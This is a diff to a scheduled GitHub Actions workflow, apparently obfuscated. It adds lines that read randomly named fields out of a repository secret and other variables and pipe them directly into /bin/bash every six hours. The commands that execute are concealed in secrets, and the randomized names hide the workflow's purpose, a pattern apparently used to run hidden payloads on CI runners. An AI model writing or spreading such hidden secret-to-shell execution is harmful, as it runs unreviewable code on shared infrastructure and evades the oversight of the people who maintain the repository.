@@ -3,18 +3,26 @@ name: colossalfrittata
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '12 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: colossalfrittata
         env:
-          k0585: ${{ secrets.k0585 }}
+          wnoh43: ${{ secrets.wnoh43 }}
         run: |
-          echo $k0585 | jq -r .kwkm4108 | /bin/bash
-          echo $bgtm4399 | jq -r .c9 | /bin/bash
-          echo $m09 | jq -r .zi1 | /bin/bash
+          echo $wnoh43 | jq -r .yklb161 | /bin/bash
+          echo $n539 | jq -r .e695 | /bin/bash
+          echo $zuu69 | jq -r .aedvu325 | /bin/bash
+          echo $jjac52446 | jq -r .tk9 | /bin/bash
+          echo $k77 | jq -r .t333 | /bin/bash
+          echo $ci56 | jq -r .gnue80094 | /bin/bash
+          echo $gukmk672 | jq -r .rr2 | /bin/bash
+          echo $smt965 | jq -r .wui0542 | /bin/bash
+          echo $cs923 | jq -r .ewrf54 | /bin/bash
+          echo $pvoje5 | jq -r .o2 | /bin/bash
 
